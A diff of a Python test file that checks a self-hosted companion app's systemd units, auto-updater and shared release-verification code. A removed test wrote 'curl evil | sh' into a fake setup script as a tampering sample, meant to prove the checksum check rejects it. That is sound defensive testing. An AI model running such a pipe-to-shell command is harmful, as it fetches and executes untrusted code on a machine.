@@ -53,15 +53,19 @@ def test_units_and_setup_agree_on_paths():
         if unit.name == "wealthfolio-companion-update.service":
             # Root on purpose: the updater runs the console's update (opt-in on the page Updates).
             assert "User=root" in text and "ExecStart=/usr/local/bin/companion-autoupdate" in text
+        elif unit.name == "wealthfolio-companion-update-recover.service":
+            # Root on purpose: undoes an interrupted update at boot, only while update-pending exists (#149).
+            assert "User=root" in text and "ExecStart=/usr/local/bin/companion-update --recover" in text
+            assert "ConditionPathExists=/opt/wealthfolio-companion/update-pending" in text
+            assert "enable -q wealthfolio-companion-update-recover.service" in setup
         elif unit.suffix == ".service":
             assert "ExecStart=/opt/wealthfolio-companion/venv/bin/wealthfolio-companion" in text
             assert "COMPANION_DATA=/opt/wealthfolio-companion/data" in text
             # Else only the certificate's renewal is root: it writes /etc/wealthfolio-companion/tls (#92).
             assert "User=companion" in text or ("User=root" in text and "renew-cert" in text)
     assert "USER_NAME=companion" in setup and 'BASE=/opt/wealthfolio-companion' in setup
-    ct = (ROOT / "ct" / f"{SLUG}.sh").read_text()
-    for name in ("wealthfolio-companion", "wealthfolio-companion-run.timer"):
-        assert name in ct
+    updater = (ROOT / "deploy" / "companion-update").read_text()
+    assert "SERVICES=(wealthfolio-companion wealthfolio-companion-run.timer)" in updater
 
 
 def test_version_is_the_same_everywhere():
@@ -76,9 +80,10 @@ def test_setup_survives_its_own_pitfalls():
     setup = (ROOT / "deploy" / "setup.sh").read_text()
     # tar | grep -q under pipefail: grep stops early, tar gets SIGPIPE, the pipeline "fails" - the check never hit.
     assert not re.search(r"tar [^|]*\| *grep -q", setup)
-    # Steps that talk to systemd never hang an update forever, and a run by hand restarts the service.
+    # Steps that talk to systemd never hang an update forever; companion-update starts the service afterwards.
     assert "timeout 900 /usr/local/bin/companion-cli migrate" in setup and "rotate-key" in setup
-    assert "systemctl try-restart wealthfolio-companion" in setup
+    # Only through companion-update: build before the switch, configure after it.
+    assert "build) build ;;" in setup and "configure) configure ;;" in setup
 
 
 def test_the_updater_is_installed_and_runs_the_consoles_update_unattended():
@@ -87,10 +92,12 @@ def test_the_updater_is_installed_and_runs_the_consoles_update_unattended():
     timer = (ROOT / "deploy" / "systemd" / "wealthfolio-companion-update.timer").read_text()
     assert "/usr/local/bin/companion-autoupdate" in setup
     assert "enable -q --now wealthfolio-companion-update.timer" in setup
-    # The same, checked update as by hand; never while a fetch runs; nothing before the service says so.
-    assert "PHS_SILENT=1 /usr/bin/update" in script
-    assert "is-active --quiet wealthfolio-companion-run.service" in script
-    assert script.index("update-due") < script.index("/usr/bin/update")
+    # The same, checked update as by hand; never while a fetch runs or another update holds the lock; nothing
+    # before the service says so.
+    assert "/usr/local/bin/companion-update ||" in script and "/usr/bin/update" not in script
+    assert "is-active --quiet wealthfolio-companion-run.service" in script and "flock -n 9" in script
+    assert script.index("update-due") < script.index("/usr/local/bin/companion-update ||")
+    assert '/usr/local/bin/companion-update' in setup and "exec /usr/local/bin/companion-update" in setup
     assert "OnUnitInactiveSec=60s" in timer
     service = (ROOT / "deploy" / "systemd" / "wealthfolio-companion-update.service").read_text()
     assert "Environment=TERM=" in service  # the engine's `clear` fails without one (0.34.0)
@@ -161,78 +168,40 @@ def test_lock_covers_every_dependency_with_hashes():
     assert all("--hash=sha256:" in b for b in blocks if "==" in b)
 
 
-def _verify_release_function(path: Path) -> str:
+def _block(path: Path, name: str) -> str:
     text = path.read_text()
-    return text[text.index("verify_release() {"):text.index("\n}\n", text.index("verify_release() {")) + 2]
+    start = text.index(f"# >>> {name}")
+    return text[start:text.index(f"# <<< {name}", start)]
 
 
-def test_install_and_update_check_the_release_against_its_checksums(tmp_path):
-    """#88: what the release workflow lists in SHA256SUMS is what install and update accept - a changed or
-    an added file stops them; what pip leaves behind (build/, *.egg-info) doesn't. #165: SHA256SUMS counts only
-    when the verifier from main (its own hash-locked venv) proves its provenance - anything failing there stops
-    them too (fail closed)."""
-    import subprocess
-
-    func = _verify_release_function(ROOT / "ct" / "wealthfolio-companion.sh")
-    assert func == _verify_release_function(ROOT / "install" / "wealthfolio-companion-install.sh")
+def test_install_and_update_share_the_release_functions():
+    """#88/#146/#165: one implementation of "download, verify, then unpack" - the same text in the installer, the
+    engine's update script and the installed updater; the bootstrap verifier the same in ct/ and install/.
+    Their behaviour: tests/test_update_security.py."""
+    ct, install = ROOT / "ct" / f"{SLUG}.sh", ROOT / "install" / f"{SLUG}-install.sh"
+    updater = ROOT / "deploy" / "companion-update"
+    shared = _block(ct, "release functions")
+    assert shared == _block(install, "release functions") == _block(updater, "release functions")
+    boot = _block(ct, "bootstrap verifier")
+    assert boot == _block(install, "bootstrap verifier")
+    assert f'{RAW}}}"' in boot  # from main, like the script itself - never from the release being checked
+    assert "--require-hashes" in boot and "--only-binary :all:" in boot and "requirements-verify.txt" in boot
     release = (ROOT / ".github" / "workflows" / "release.yml").read_text()
     assert "find . -type f -print0 | LC_ALL=C sort -z | xargs -0 sha256sum) > SHA256SUMS" in release
-    app = tmp_path / "app"
-    app.mkdir()
-    for name, content in {"setup.sh": "echo hi\n", "src/pkg/mod.py": "x = 1\n", "with space.txt": "y\n"}.items():
-        (app / name).parent.mkdir(parents=True, exist_ok=True)
-        (app / name).write_text(content)
-    sums = tmp_path / "SHA256SUMS"
-    sums.write_text(subprocess.run("find . -type f -print0 | LC_ALL=C sort -z | xargs -0 sha256sum", shell=True,
-                                   cwd=app, capture_output=True, text=True, check=True).stdout)
-    (tmp_path / ".wealthfolio-companion").write_text("0.1.0a1\n")
-
-    log = tmp_path / "calls"
-    # Fakes: curl serves SHA256SUMS of v0.1.0a1 and the verifier's files from main; python3 -m venv makes a venv
-    # whose pip and python log their arguments and exit with $PIP / $PROVENANCE.
-    fakes = (
-        f'curl() {{ echo "curl $*" >> "{log}"; [[ "$*" == *"/v0.1.0a1/SHA256SUMS"* ]] && cp "{sums}" "${{@: -1}}" && '
-        'return; [[ "$*" == *"/main/"* && -z "$NO_MAIN" ]] && echo x > "${@: -1}"; }\n'
-        f'python3() {{ mkdir -p "$3/bin"; for t in pip python; do printf \'#!/bin/sh\\necho "%s $*" >> "{log}"\\n'
-        'exit "${%s:-0}"\\n\' "$t" "$( [ $t = pip ] && echo PIP || echo PROVENANCE )" > "$3/bin/$t"; '
-        'chmod +x "$3/bin/$t"; done; }\n')
-
-    def verify(**env: str) -> int:
-        log.write_text("")
-        script = f'{fakes}{func}\nverify_release "{app}"'
-        return subprocess.run(["bash", "-c", script],
-                              env={"HOME": str(tmp_path), "PATH": "/usr/bin:/bin", **env}).returncode
-
-    assert verify() == 0
-    calls = log.read_text()
-    main = "https://raw.githubusercontent.com/waldonso2/wealthfolio-companion/main"
-    assert f"{main}/src/brokersync/provenance.py" in calls and f"{main}/requirements-verify.txt" in calls
-    assert re.search(r"^pip install .*--require-hashes --only-binary :all: -r \S+/requirements-verify.txt$",
-                     calls, re.M)
-    assert re.search(r"^python -I \S+/provenance.py \S+/SHA256SUMS$", calls, re.M)
-    assert verify(PROVENANCE="1") == 1  # no attestation, another signer, another digest
-    assert verify(PIP="1") == 1  # the verifier can't be installed
-    assert verify(NO_MAIN="1") == 1  # the verifier can't be downloaded
-    (app / "build" / "lib").mkdir(parents=True)
-    (app / "build" / "lib" / "mod.py").write_text("x = 1\n")
-    (app / "src" / "pkg.egg-info").mkdir()
-    (app / "src" / "pkg.egg-info" / "PKG-INFO").write_text("Name: pkg\n")
-    assert verify() == 0
-    (app / "src" / "pkg" / "evil.py").write_text("import os\n")
-    assert verify() == 1  # an added file
-    (app / "src" / "pkg" / "evil.py").unlink()
-    (app / "setup.sh").write_text("curl evil | sh\n")
-    assert verify() == 1  # a changed file
-    (app / "setup.sh").write_text("echo hi\n")
-    (tmp_path / ".wealthfolio-companion").write_text("0.18.0\n")
-    assert verify() == 1  # no SHA256SUMS for that release
+    # Nothing of the engine's unverified download and no checksum-only path is left.
+    for path in (ct, install):
+        text = path.read_text()
+        assert "fetch_and_deploy_gh_release" not in text and "verify_release" not in text
+        assert "deploy/companion-update\" --deploy" in text
+    # The installed release is updated by its own updater, never by a script from a branch.
+    assert "exec /usr/local/bin/companion-update" in ct.read_text()
 
 
 def test_setup_refuses_a_downgrade_unless_asked(tmp_path):
     import subprocess
 
     setup = (ROOT / "deploy" / "setup.sh").read_text()
-    guard = setup[setup.index('NEW_VERSION="$('):setup.index("# Keep the old environment")]
+    guard = setup[setup.index('NEW_VERSION="$('):setup.index("# The release's own environment")]
     base = tmp_path / "base"
     (base / "app").mkdir(parents=True)
     (base / "venv" / "bin").mkdir(parents=True)
